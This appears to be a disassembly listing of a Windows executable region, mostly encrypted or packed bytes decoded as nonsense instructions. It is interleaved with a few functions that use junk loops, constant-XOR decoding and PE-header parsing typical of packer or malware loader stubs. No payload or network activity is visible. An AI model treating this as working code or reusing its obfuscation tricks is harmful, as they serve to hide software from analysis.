  410200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410201:	out    dx,eax
  410202:	sub    dl,BYTE PTR [ebp-0x33]
  410205:	cmp    eax,0x5dd865e7
  41020a:	mov    WORD PTR [ecx],gs
  41020c:	sub    eax,0x6c3c9114
  410211:	add    al,0x9
  410213:	mov    esi,0x6dc207d1
  410218:	aaa    
  410219:	adc    al,0x47
  41021b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41021c:	cmp    ch,BYTE PTR [edx+0x542f4d5a]
  410222:	aam    0xbc
  410224:	cmc    
  410225:	jmp    0xd770:0xafccdcb5
  41022c:	xchg   esp,eax
  41022d:	pop    ebp
  41022e:	push   ebp
  41022f:	pop    es
  410230:	jmp    0xc74f:0xf1dedd74
  410237:	fwait
  410238:	lods   al,BYTE PTR ds:[esi]
  410239:	xchg   ebx,eax
  41023a:	adc    esp,DWORD PTR gs:[edx+0x36d60c66]
  410241:	inc    edx
  410242:	xchg   edi,eax
  410243:	mov    bl,0x7
  410245:	sbb    ah,BYTE PTR [eax+0x17]
  410248:	xor    BYTE PTR [eax-0x6829ac9a],bh
  41024e:	jno    0x4102c2
  410250:	adc    ah,BYTE PTR [ebp+ecx*1-0x70]
  410254:	mov    ch,0x16
  410256:	jb     0x4102a3
  410258:	stc    
  410259:	mov    edx,0x79eed28c
  41025e:	dec    edi
  41025f:	ja     0x410228
  410261:	inc    edx
  410262:	(bad)  
  410263:	(bad)  
  410264:	clc    
  410265:	enter  0x57da,0xfa
  410269:	mov    bh,0x3c
  41026b:	sub    dh,BYTE PTR [edx+0x548d9226]
  410271:	mov    ch,ah
  410273:	adc    ebx,DWORD PTR [eax+ebx*8-0x558f9605]
  41027a:	dec    edi
  41027b:	push   0x20c986d
  410280:	mov    dl,0x93
  410282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410283:	xchg   esi,eax
  410284:	pop    eax
  410285:	(bad)  
  410286:	jle    0x410297
  410288:	hlt    
  410289:	(bad)  
  41028b:	sub    DWORD PTR [edx],edi
  41028d:	mov    dh,0x44
  41028f:	xchg   cl,ch
  410291:	imul   ebp,DWORD PTR ds:0xb5938419,0xc5a15f60
  41029b:	dec    ebp
  41029c:	(bad)  
  41029d:	cld    
  41029e:	stos   BYTE PTR es:[edi],al
  41029f:	inc    esi
  4102a0:	fbld   TBYTE PTR [esp+eiz*4-0x73]
  4102a4:	sbb    al,0x85
  4102a6:	sar    BYTE PTR [edx],1
  4102a8:	inc    edx
  4102a9:	call   0x88cd:0x29d3a057
  4102b0:	jecxz  0x410276
  4102b2:	rcl    DWORD PTR [ebp+0x79],1
  4102b5:	inc    edi
  4102b6:	mov    cl,0xf6
  4102b8:	sub    DWORD PTR [esi+0x65],ecx
  4102bb:	shr    DWORD PTR [edx],0x54
  4102be:	sub    BYTE PTR ds:0x633467e7,ah
  4102c4:	mov    ecx,0x4b020e6f
  4102c9:	mov    bh,0x72
  4102cb:	ins    DWORD PTR es:[edi],dx
  4102cc:	inc    eax
  4102cd:	aas    
  4102ce:	cmp    edi,DWORD PTR [ebx-0xabad582]
  4102d4:	push   esp
  4102d5:	bsr    esi,DWORD PTR [ebx+edx*4]
  4102d9:	fsubr  DWORD PTR [ebp+0x4686597a]
  4102df:	sbb    ah,BYTE PTR [ebx+ebx*2+0x4d]
  4102e3:	ins    DWORD PTR es:[edi],dx
  4102e4:	sub    BYTE PTR [ecx-0x6f75aee5],ch
  4102ea:	xor    BYTE PTR [edx+0x58561402],ch
  4102f0:	dec    BYTE PTR [esi]
  4102f2:	test   al,ah
  4102f4:	add    DWORD PTR [ecx+0x77d0a707],esi
  4102fa:	lds    edi,FWORD PTR [ebx+0x7f]
  4102fd:	lods   eax,DWORD PTR ds:[esi]
  4102fe:	jbe    0x410350
  410300:	jp     0x41035c
  410302:	push   esi
  410303:	pop    ds
  410304:	adc    dh,BYTE PTR [edi+eiz*4-0x795d8042]
  41030b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41030c:	dec    esi
  41030d:	push   eax
  41030e:	mov    bl,0xf
  410310:	jmp    0xbe4:0xfb4b5fea
  410317:	pop    edx
  410318:	fwait
  410319:	push   0xffffff99
  41031b:	ret    
  41031c:	hlt    
  41031d:	loop   0x410334
  41031f:	shl    DWORD PTR [ebx+0x74],1
  410322:	pop    es
  410323:	dec    ebp
  410324:	dec    ebp
  410325:	int    0xf8
  410327:	xchg   ebp,eax
  410328:	xor    BYTE PTR [ebx+0x36],ch
  41032b:	xor    BYTE PTR [esi+ebp*4+0x5f],al
  41032f:	mov    cl,cl
  410331:	adc    al,0x21
  410334:	imul   edi,DWORD PTR [ecx+0x29],0x3b03b932
  41033b:	lds    ebp,FWORD PTR [ebx+0x45]
  41033e:	mov    BYTE PTR [eax-0x2a07c7c1],bl
  410344:	push   esp
  410345:	dec    edi
  410346:	fcom   QWORD PTR [ebp-0x16]
  410349:	inc    esi
  41034a:	(bad)  
  41034c:	ds pop ecx
  41034e:	and    eax,0x2b20e3e8
  410353:	push   ebp
  410354:	pusha  
  410355:	into   
  410356:	imul   esi,DWORD PTR [ebp-0x4f],0x5aa50d3a
  41035d:	or     eax,0xc3a4488a
  410362:	stos   DWORD PTR es:[edi],eax
  410363:	fiadd  WORD PTR [ebx]
  410365:	jp     0x410372
  410367:	and    al,0xa9
  410369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41036a:	ret    
  41036b:	xor    eax,0xaca4df07
  410370:	fadd   QWORD PTR [ebp+0x2f]
  410373:	adc    al,0xce
  410375:	test   DWORD PTR [ebp-0x70d702b7],ebx
  41037b:	ret    0x21a7
  41037e:	fistp  DWORD PTR [ebp-0x48c737f0]
  410384:	imul   esp
  410386:	dec    edx
  410387:	sbb    DWORD PTR [eax+0x13],edi
  41038a:	pop    esi
  41038b:	jg     0x410325
  41038d:	add    BYTE PTR [ebp+0xc],ch
  410390:	(bad)  
  410391:	cli    
  410392:	sub    DWORD PTR [edi-0x32],0x9b7f59a6
  410399:	sub    al,0xc3
  41039b:	sar    DWORD PTR [edi],1
  41039d:	add    edi,DWORD PTR [edx+ebx*4-0x71]
  4103a1:	dec    esp
  4103a2:	or     dh,BYTE PTR [esi]
  4103a4:	mov    dh,0x60
  4103a6:	cmp    eax,0x2aff4d31
  4103ab:	jge    0x410362
  4103ad:	shl    BYTE PTR [edx+0x471c8c91],cl
  4103b3:	add    BYTE PTR [eax+0x5981f4a0],bl
  4103b9:	jno    0x41041f
  4103bb:	jmp    0x7f05:0x3e9b8112
  4103c2:	(bad)  
  4103c3:	out    dx,eax
  4103c4:	push   eax
  4103c5:	adc    al,0x58
  4103c7:	pop    ebx
  4103c8:	shl    ebx,0x56
  4103cb:	icebp  
  4103cc:	iret   
  4103cd:	xchg   edx,eax
  4103ce:	test   BYTE PTR ds:0xfda6ef25,bl
  4103d4:	add    al,ah
  4103d6:	in     al,dx
  4103d7:	pop    ds
  4103d8:	fisttp DWORD PTR [eax+0x75]
  4103db:	(bad)  
  4103dc:	mov    ch,0xd1
  4103de:	cmp    BYTE PTR [ebp+0x79e20525],0x16
  4103e5:	or     al,BYTE PTR [edx+ecx*1-0x11]
  4103e9:	aaa    
  4103ea:	outs   dx,BYTE PTR ds:[esi]
  4103eb:	imul   edi,ebp,0x4797c757
  4103f1:	ficom  DWORD PTR [ebx-0x9]
  4103f4:	cli    
  4103f5:	or     edi,DWORD PTR [eax-0x1f91ac51]
  4103fb:	js     0x41046c
  4103fd:	popa   
  4103fe:	jle    0x410425
  410400:	outs   dx,BYTE PTR ds:[esi]
  410401:	cmp    BYTE PTR [esi],dl
  410403:	neg    bh
  410405:	(bad)  
  410406:	int3   
  410407:	retf   0xb170
  41040a:	pushf  
  41040b:	push   edx
  41040c:	add    esi,edi
  41040e:	fs push es
  410410:	sub    BYTE PTR ds:0x42dda1e5,ch
  410416:	mov    ah,0x3a
  410418:	stos   DWORD PTR es:[edi],eax
  410419:	pop    eax
  41041a:	ror    DWORD PTR [edi],0x97
  41041d:	mov    ah,0xb6
  41041f:	mov    eax,0x6ef71ff4
  410424:	mov    eax,0x8fc697b2
  410429:	aam    0xe4
  41042b:	mov    dh,0x1f
  41042d:	xchg   edi,eax
  41042e:	inc    ebx
  41042f:	cmp    eax,0xbf4aedb2
  410434:	inc    esp
  410435:	imul   edx,DWORD PTR [ebx*4+0x628e3853],0xfffffff8
  41043d:	scas   eax,DWORD PTR es:[edi]
  41043e:	pop    edx
  41043f:	fdivr  DWORD PTR [eax+0x3e]
  410442:	mov    cl,0x27
  410444:	dec    esp
  410445:	loopne 0x41049f
  410447:	je     0x410432
  410449:	fstp   DWORD PTR [esi]
  41044b:	push   edi
  41044c:	fld    QWORD PTR [ebx+0x51]
  41044f:	sbb    DWORD PTR [esi+eiz*8-0x54574106],edx
  410456:	dec    esi
  410457:	into   
  410458:	mov    fs,WORD PTR [ebp+0x3efe8dbc]
  41045e:	dec    eax
  41045f:	loope  0x41040e
  410461:	cmp    BYTE PTR [eax+0x517156ce],ah
  410467:	mul    edx
  410469:	sar    DWORD PTR [edi+0x4bcfd5c5],1
  41046f:	outs   dx,DWORD PTR ds:[esi]
  410470:	and    ebx,DWORD PTR [edx+eax*1-0x1e4182ce]
  410477:	sbb    DWORD PTR [ebp-0x13],eax
  41047a:	vmaxsd xmm4,xmm4,QWORD PTR [edx]
  41047e:	and    al,0x71
  410480:	xchg   edx,eax
  410481:	add    ebx,DWORD PTR [ebx-0x1cdeb672]
  410487:	mov    WORD PTR [eax+0x63],fs
  41048a:	and    ebx,DWORD PTR [ecx]
  41048c:	cmp    DWORD PTR [ecx-0x1e7aaf02],ebp
  410492:	cmp    DWORD PTR [ecx],0x13
  410495:	loopne 0x41050b
  410497:	mov    eax,ds:0x258b675c
  41049c:	test   edi,ebp
  41049e:	mov    dh,0x5
  4104a0:	cdq    
  4104a1:	sahf   
  4104a2:	jg     0x4104ec
  4104a4:	cwde   
  4104a5:	and    DWORD PTR [ebp+0x677e365b],esi
  4104ab:	inc    edi
  4104ac:	dec    eax
  4104ad:	sub    DWORD PTR [ecx-0x53],ebx
  4104b0:	imul   esp,ebp,0xffffffea
  4104b3:	test   ebx,edi
  4104b5:	xchg   ebx,eax
  4104b6:	clc    
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4344f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4344f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4344f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4344f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4344f7
  410508:	dec    eax
  410509:	mov    ds:0x4344f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4344f7
  410516:	dec    eax
  410517:	mov    ds:0x4344f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434547,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43458f,0x434613
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43454f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434587
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4344eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4344eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4344eb,edx
  410571:	cmp    DWORD PTR ds:0x4344eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4344eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4344eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4344eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4344eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	pushf  
  4105ed:	cmp    BYTE PTR [esp+eax*8-0xa],0x47
  4105f2:	jle    0x410672
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x4105a3
  4105f9:	cs pop ebp
  4105fb:	push   ds
  4105fc:	cmc    
  4105fd:	xor    DWORD PTR [ebp+0x49],esp
  410600:	out    dx,al
  410601:	div    DWORD PTR [edx+ebp*2]
  410604:	sbb    esp,DWORD PTR [ebx-0x3b8e7447]
  41060a:	out    0xb9,al
  41060c:	rcl    DWORD PTR [edx-0x4a6e62d6],cl
  410612:	mov    ah,0xe2
  410614:	dec    edi
  410615:	lods   al,BYTE PTR ds:[esi]
  410616:	xor    eax,esp
  410618:	ja     0x41067d
  41061a:	les    esi,FWORD PTR [edx-0x3d51596d]
  410620:	scas   al,BYTE PTR es:[edi]
  410621:	lods   eax,DWORD PTR ds:[esi]
  410622:	and    DWORD PTR [eax-0x439addef],edx
  410628:	xchg   edi,eax
  410629:	std    
  41062a:	int    0xb0
  41062c:	mov    bl,0x1f
  41062e:	icebp  
  41062f:	and    DWORD PTR [edx-0xabcd21e],ecx
  410635:	shr    BYTE PTR [edi-0x30b69fc8],1
  41063b:	xchg   esi,eax
  41063c:	idiv   BYTE PTR [edi+0x55]
  41063f:	mov    WORD PTR [esi-0x36],?
  410642:	in     al,0xfc
  410644:	cmp    al,0xab
  410646:	ins    BYTE PTR es:[edi],dx
  410647:	mov    ds:0x70edf46a,eax
  41064c:	test   eax,0x8fa408e4
  410651:	lods   al,BYTE PTR ds:[esi]
  410653:	push   0x2a
  410655:	cmp    dh,BYTE PTR ds:0xb599be2d
  41065b:	fdivr  DWORD PTR [edx-0x5e]
  41065e:	cli    
  41065f:	fldcw  WORD PTR [ebx]
  410661:	mov    ch,0x55
  410663:	fdivr  st,st(7)
  410665:	test   DWORD PTR [edi],edx
  410667:	and    al,ch
  410669:	ss push esi
  41066b:	sbb    DWORD PTR [eax+0x33ebc288],eax
  410671:	sub    BYTE PTR [ebx+0x51],bh
  410674:	dec    edx
  410675:	mov    WORD PTR [edi*8+0x14977241],ss
  41067c:	mov    BYTE PTR [edi+edi*2-0x79ffd617],cl
  410683:	test   BYTE PTR [eax+0x44701b32],bh
  410689:	sar    DWORD PTR [edx+0x5f],0x80
  41068d:	xchg   BYTE PTR ds:0xcbbceaef,dl
  410693:	loop   0x410667
  410695:	rcl    DWORD PTR [ebp+0x3e],0xfd
  410699:	mov    bl,BYTE PTR [ebx]
  41069b:	ins    DWORD PTR es:[edi],dx
  41069c:	pop    esp
  41069d:	retf   0x1729
  4106a0:	jg     0x4106a9
  4106a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106a3:	and    BYTE PTR [esi-0x3cfea4a9],dh
  4106a9:	mov    cl,0x49
  4106ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ac:	inc    ebp
  4106ad:	lods   eax,DWORD PTR ds:[esi]
  4106ae:	call   0x8146:0xae959407
  4106b5:	cmp    BYTE PTR [ebx-0x33f44a2e],dh
  4106bb:	dec    edx
  4106bc:	aaa    
  4106bd:	aaa    
  4106be:	scas   al,BYTE PTR es:[edi]
  4106bf:	sub    eax,DWORD PTR [ebp-0x4758017d]
  4106c5:	pop    ebx
  4106c6:	scas   eax,DWORD PTR es:[edi]
  4106c7:	leave  
  4106c8:	mov    ds:0xad4a52f0,eax
  4106cd:	fcmovb st,st(0)
  4106cf:	adc    al,0x80
  4106d1:	(bad)  [edi]
  4106d3:	mov    bl,0xc2
  4106d5:	mov    ah,0x22
  4106d7:	mov    bl,0x4e
  4106d9:	aam    0x34
  4106db:	xor    cl,BYTE PTR [ebx+0x21]
  4106de:	inc    edx
  4106df:	push   ecx
  4106e0:	jecxz  0x410756
  4106e2:	data16 test BYTE PTR [edi*1-0x7a8c5e01],0x88
  4106eb:	mov    BYTE PTR [edi+0x4e8d5c58],al
  4106f1:	loop   0x4106f4
  4106f3:	push   eax
  4106f4:	inc    ebp
  4106f5:	push   0xffffffb6
  4106f7:	pusha  
  4106f8:	sar    al,cl
  4106fa:	mov    esp,0xc5b94b46
  4106ff:	inc    edx
  410700:	inc    ebx
  410701:	js     0x41077f
  410703:	test   edx,esp
  410705:	push   cs
  410706:	dec    edi
  410707:	push   cs
  410708:	mov    ah,0xb6
  41070a:	fcomp  QWORD PTR [esi+0x39802b3b]
  410710:	retf   
  410711:	mov    cl,0x25
  410713:	shl    edi,cl
  410715:	rol    BYTE PTR [ebx-0x20353306],0xd3
  41071c:	xchg   BYTE PTR [edi+0x25f700ba],cl
  410722:	(bad)  
  410723:	adc    eax,DWORD PTR [eax-0x7f409cf0]
  410729:	push   cs
  41072a:	int3   
  41072b:	fmul   QWORD PTR [esi+ecx*1]
  41072e:	mov    edx,0xe246d2a4
  410733:	xchg   ebx,eax
  410734:	ins    BYTE PTR es:[edi],dx
  410735:	sub    esp,DWORD PTR [ecx]
  410737:	xor    dl,BYTE PTR ds:0x75f4559e
  41073d:	and    cl,BYTE PTR [esi]
  41073f:	bound  edi,QWORD PTR [edx]
  410741:	push   0xffffffd6
  410743:	inc    edi
  410744:	or     edx,DWORD PTR [ebx+0x6c863198]
  41074a:	xchg   esi,eax
  41074b:	(bad)  
  41074c:	pop    esi
  41074d:	aaa    
  41074e:	cmp    edi,0x67
  410751:	iret   
  410752:	xor    ch,cl
  410754:	mov    BYTE PTR [edi+0x40],ah
  410757:	mov    al,0x2e
  410759:	es scas al,BYTE PTR es:[edi]
  41075b:	add    dh,BYTE PTR [edx]
  41075d:	lds    eax,FWORD PTR [edi+edi*1]
  410760:	jne    0x410759
  410762:	in     al,dx
  410763:	mov    al,ds:0xd09ecbfb
  410768:	xor    al,BYTE PTR [ebp+0x37a370f7]
  41076e:	jecxz  0x41072a
  410770:	daa    
  410771:	mov    DWORD PTR [esi+eiz*4+0x33c7baac],ebp
  410778:	(bad)  
  410779:	adc    eax,0xf71f8caf
  41077e:	lods   eax,DWORD PTR ds:[esi]
  41077f:	push   DWORD PTR [ecx-0x5ad9225e]
  410785:	xlat   BYTE PTR ds:[ebx]
  410786:	mov    ds:0xbffda8b,eax
  41078b:	sbb    BYTE PTR [ebx],ch
  41078d:	ror    BYTE PTR [ebx+0x27],cl
  410790:	sahf   
  410791:	mov    es,WORD PTR [ebp-0x40]
  410794:	mov    DWORD PTR [edx-0x75],0x99b90875
  41079b:	jb     0x4107cf
  41079d:	add    cl,ch
  41079f:	mov    dh,0x1
  4107a1:	add    BYTE PTR [eax],al
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	add    DWORD PTR [edx],esi
  4107b1:	not    DWORD PTR [edx]
  4107b3:	adc    al,0x41
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x41079a
  4107bc:	add    eax,0x433c20fe
  4107c1:	(bad)  
  4107c3:	add    eax,esp
  4107c5:	adc    eax,0xbd36790b
  4107ca:	fld    TBYTE PTR [ecx]
  4107cc:	push   ds
  4107cd:	aas    
  4107ce:	push   edi
  4107cf:	bound  edi,QWORD PTR [ebx+0x1df2503f]
  4107d5:	out    dx,eax
  4107d6:	nop
  4107d7:	leave  
  4107d8:	bound  ebp,QWORD PTR [esi]
  4107da:	lods   al,BYTE PTR ds:[esi]
  4107db:	nop
  4107dc:	xor    DWORD PTR [eax+eax*1-0x47fd566f],ecx
  4107e3:	dec    ebx
  4107e4:	popa   
  4107e5:	sbb    DWORD PTR [ecx+0x42844822],edi
  4107eb:	scas   eax,DWORD PTR es:[edi]
  4107ec:	imul   edi,ecx,0x60
  4107ef:	ror    DWORD PTR [edx+0x69],1
  4107f2:	jo     0x410843
  4107f4:	repnz repz and DWORD PTR [ebx-0x11d0a1b1],ecx
  4107fc:	pop    ebp
  4107fd:	int3   
  4107fe:	mov    dl,0x3c
  410800:	mov    cl,0x45
  410802:	mov    edi,0xb0a096f1
  410807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410808:	dec    ebp
  410809:	retf   
  41080a:	xlat   BYTE PTR ds:[ebx]
  41080b:	mov    ecx,?
  41080d:	jno    0x4107a4
  41080f:	in     al,dx
  410810:	(bad)  
  410811:	out    0x95,eax
  410813:	and    BYTE PTR [edx+0x620505d4],dh
  410819:	test   eax,0x3eda5034
  41081e:	aaa    
  41081f:	in     al,0x71
  410821:	fs mov cl,0x3d
  410824:	outs   dx,DWORD PTR ds:[esi]
  410825:	mov    ebx,0x4d544e53
  41082a:	aas    
  41082b:	jno    0x410884
  41082d:	xchg   DWORD PTR [ebx+eax*8+0x391fd3f6],eax
  410834:	lock gs popf 
  410837:	or     edi,DWORD PTR [ebx]
  410839:	shr    BYTE PTR [ebp+0x3689ae7a],0x75
  410840:	std    
  410841:	inc    esi
  410842:	dec    eax
  410843:	mov    dl,0xc
  410845:	(bad)  
  410846:	fimul  DWORD PTR [eax-0x6ac9a53b]
  41084c:	xlat   BYTE PTR ds:[ebx]
  41084d:	(bad)  
  41084e:	cli    
  41084f:	mov    eax,0xfa066b51
  410854:	push   esi
  410855:	retf   0xdff8
  410858:	aaa    
  410859:	pop    es
  41085a:	iret   
  41085b:	fisubr DWORD PTR [ecx-0x3d]
  41085e:	test   al,0x43
  410860:	sbb    al,0x32
  410862:	inc    edi
  410863:	add    cl,ch
  410865:	call   0x875f:0x377a9d86
  41086c:	mov    edx,0x41b7fdc1
  410871:	pmaxsw mm3,mm1
  410874:	sub    al,0xc2
  410876:	cwde   
  410877:	stc    
  410878:	das    
  410879:	loopne 0x4108cc
  41087b:	inc    BYTE PTR [edi-0x4c7a838c]
  410881:	jle    0x4108f8
  410883:	adc    ecx,DWORD PTR [edx]
  410885:	adc    al,0x1
  410887:	mov    WORD PTR [esi],ds
  410889:	mov    eax,ds:0x522ae030
  41088e:	mov    ch,0x47
  410890:	sbb    ah,bh
  410892:	nop
  410893:	add    BYTE PTR [edx],ch
  410895:	or     BYTE PTR [ecx-0x69],0x94
  410899:	inc    edi
  41089a:	xchg   DWORD PTR [ecx+0x58],edx
  41089d:	test   eax,0x3a4a247e
  4108a2:	ins    DWORD PTR es:[edi],dx
  4108a3:	and    ecx,ebx
  4108a5:	std    
  4108a6:	out    dx,eax
  4108a7:	mov    BYTE PTR [ecx+0x4],bl
  4108aa:	pusha  
  4108ab:	dec    ebp
  4108ac:	jnp    0x4108a5
  4108ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108af:	aad    0x29
  4108b1:	sbb    DWORD PTR [ebx+0x3f482584],edx
  4108b7:	(bad)  
  4108b8:	std    
  4108b9:	mov    dh,0x31
  4108bb:	js     0x410880
  4108bd:	ins    DWORD PTR es:[edi],dx
  4108be:	mov    WORD PTR [ebx],?
  4108c0:	jge    0x41087d
  4108c2:	jecxz  0x410899
  4108c4:	dec    esp
  4108c5:	push   esi
  4108c6:	stos   DWORD PTR es:[edi],eax
  4108c7:	ins    DWORD PTR es:[edi],dx
  4108c8:	(bad)  
  4108c9:	push   esi
  4108ca:	or     eax,0x29bd73a1
  4108cf:	jne    0x4108cb
  4108d1:	ja     0x41088e
  4108d3:	or     cl,cl
  4108d5:	ret    
  4108d6:	push   ebp
  4108d7:	mov    dl,0x71
  4108d9:	lock and BYTE PTR [esi+0x3f],cl
  4108dd:	pop    edx
  4108de:	or     ebx,DWORD PTR [edi+0x29]
  4108e1:	(bad)  
  4108e2:	rcr    al,1
  4108e4:	dec    ebx
  4108e5:	scas   eax,DWORD PTR es:[edi]
  4108e6:	and    DWORD PTR [eax],ebp
  4108e8:	outs   dx,DWORD PTR ds:[esi]
  4108e9:	fstp   QWORD PTR [edx]
  4108eb:	xlat   BYTE PTR ds:[ebx]
  4108ec:	pop    edi
  4108ed:	push   ecx
  4108ee:	inc    eax
  4108ef:	cs enter 0x7bf9,0xfd
  4108f4:	cli    
  4108f5:	(bad)  
  4108f7:	sub    DWORD PTR [edx],ebx
  4108f9:	sbb    eax,0x4d5cc389
  4108fe:	pop    es
  4108ff:	sahf   
  410900:	add    al,0xe4
  410902:	aas    
  410903:	and    BYTE PTR [ebp-0x5b218427],0x64
  41090a:	dec    ebp
  41090b:	test   al,0xcf
  41090d:	fs push esi
  41090f:	push   0x70
  410911:	into   
  410912:	jae    0x4108ed
  410914:	pop    esi
  410915:	scas   al,BYTE PTR es:[edi]
  410916:	prefetcht2 BYTE PTR [esi-0x3d]
  41091a:	daa    
  41091b:	lods   al,BYTE PTR ds:[esi]
  41091c:	shr    DWORD PTR [edx],1
  41091e:	add    ebx,DWORD PTR [edx]
  410920:	fdiv   QWORD PTR [edi-0xa9f3b93]
  410926:	mov    bl,0xb3
  410928:	or     bh,BYTE PTR [esi+ebx*2-0x11]
  41092c:	mov    esp,0x52cb67d9
  410931:	jge    0x4108ff
  410933:	jno    0x410981
  410935:	test   DWORD PTR [edx-0x5827452f],ecx
  41093b:	mov    ds:0x39ea12a6,al
  410940:	fidivr DWORD PTR [ecx]
  410942:	jle    0x4108fc
  410944:	add    ah,BYTE PTR [ebx-0x53]
  410947:	push   ecx
  410948:	hlt    
  410949:	push   eax
  41094a:	add    DWORD PTR [edx+0x44634a4],edx
  410950:	cmp    edx,ebp
  410952:	add    BYTE PTR [esi],ch
  410954:	or     al,0xdf
  410956:	mul    DWORD PTR [edi]
  410958:	sbb    eax,DWORD PTR [ebx]
  41095a:	sar    DWORD PTR [ecx],0x46
  41095d:	push   esp
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4344ef,0x0
  41099b:	mov    eax,ds:0x4344ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4344ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4344ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4344ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4344ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4344ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4344ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4345cf
  4109f5:	adc    DWORD PTR ds:0x4344e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4345bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434507,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	pop    ebx
  410a2e:	shl    DWORD PTR [esi+0x50],1
  410a31:	stos   BYTE PTR es:[edi],al
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410a11
  410a3a:	lods   eax,DWORD PTR ds:[esi]
  410a3b:	mov    bl,0x37
  410a3d:	sub    BYTE PTR [edx+0x701480f9],bl
  410a43:	stc    
  410a44:	push   edx
  410a45:	add    ebp,DWORD PTR [edx+0x3e758c97]
  410a4b:	je     0x410a20
  410a4d:	mov    dl,0x41
  410a4f:	push   ebx
  410a50:	out    dx,eax
  410a51:	das    
  410a52:	jmp    0x410a1a
  410a54:	adc    BYTE PTR [ecx],al
  410a56:	mov    dh,0xc2
  410a58:	pop    edi
  410a59:	sub    al,0x98
  410a5b:	inc    ecx
  410a5c:	and    eax,0x4cf62a22
  410a61:	in     eax,dx
